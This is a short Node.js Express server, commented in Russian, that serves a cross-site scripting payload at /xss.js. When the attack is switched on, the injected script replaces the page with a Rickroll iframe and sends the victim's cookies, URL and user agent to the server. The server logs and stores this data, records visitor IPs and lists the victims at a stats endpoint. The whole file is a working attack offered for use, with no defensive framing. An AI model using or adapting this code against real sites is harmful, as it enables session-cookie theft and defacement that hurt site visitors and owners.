const express = require('express');
const app = express();

// Хранилище для данных
let rickrollData = {
    active: false,
    html: '',
    visitors: []
};

app.get('/xss.js', (req, res) => {
    // Сохраняем IP посетителя
    rickrollData.visitors.push(req.ip);
    
    // Отдаем скрипт с данными с сервера
    res.send(`
        // Данные с сервера
        const serverData = ${JSON.stringify(rickrollData)};
        
        // Если атака активна - применяем
        if(serverData.active) {
            document.body.innerHTML = serverData.html;
            
            // Отправляем данные о жертве на сервер
            fetch('/victim-data', {
                method: 'POST',
                body: JSON.stringify({
                    cookies: document.cookie,
                    url: window.location.href,
                    userAgent: navigator.userAgent
                })
            });
        }
        
        // Функция для активации атаки (только для админа)
        window.activateRickroll = function() {
            fetch('/activate', {
                method: 'POST',
                body: JSON.stringify({
                    html: '<div style=\\"background:black;color:white;height:100vh\\"><h1>😂</h1><iframe src=\\"https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1\\"></iframe></div>'
                })
            }).then(() => location.reload());
        };
    `);
});

// Активация атаки
app.post('/activate', express.json(), (req, res) => {
    rickrollData.active = true;
    rickrollData.html = req.body.html;
    res.json({ok: true});
});

// Получение данных о жертвах
app.post('/victim-data', express.json(), (req, res) => {
    console.log('Жертва:', req.body);
    rickrollData.victims = rickrollData.victims || [];
    rickrollData.victims.push(req.body);
    res.json({ok: true});
});

// Статистика (только для админа)
app.get('/stats', (req, res) => {
    res.json({
        active: rickrollData.active,
        victimsCount: rickrollData.visitors.length,
        victims: rickrollData.victims || []
    });
});

app.listen(3000);
